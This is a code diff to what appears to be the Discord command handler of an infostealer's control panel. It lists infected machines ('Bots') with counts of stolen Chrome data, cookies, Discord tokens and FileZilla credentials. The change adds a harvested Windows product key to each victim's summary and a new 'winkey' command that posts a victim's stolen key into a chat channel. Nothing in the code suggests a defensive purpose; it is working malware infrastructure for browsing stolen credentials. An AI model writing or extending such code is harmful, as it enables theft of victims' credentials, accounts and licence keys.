@@ -86,6 +86,9 @@ exports.run = (client, message, args) => {
                     },
                 });
 
+                const winKey =
+                    element.windowsKey && element.windowsKey != "" ? 1 : 0;
+
                 const screenShotPath =
                     screenshotData.length > 0 ? screenshotData[0].link : "";
 
@@ -128,7 +131,7 @@ exports.run = (client, message, args) => {
                             **Architecture**: ${element.architecture}
                             **Boot Time**: ${element.bootTime}
                             **Memory**: ${element.memory}
-                            **Available Info**: \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\``,
+                            **Available Info**: \`Windows Key ${winKey}\` \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -152,7 +155,30 @@ exports.run = (client, message, args) => {
             }
         });
     } else if (args.length == 2) {
-        if (args[1] == "chrome") {
+        if (args[1] == "winkey") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (
+                    result.length > 0 &&
+                    result[0].windowsKey &&
+                    result[0].windowsKey.length > 0
+                ) {
+                    message.channel.send(`\`\`\`${result[0].windowsKey}\`\`\``);
+                } else {
+                    message.channel.send("Windows Key not found");
+                }
+            });
+        } else if (args[1] == "chrome") {
             db.Bots.findAll({
                 where: {
                     [Op.or]: [
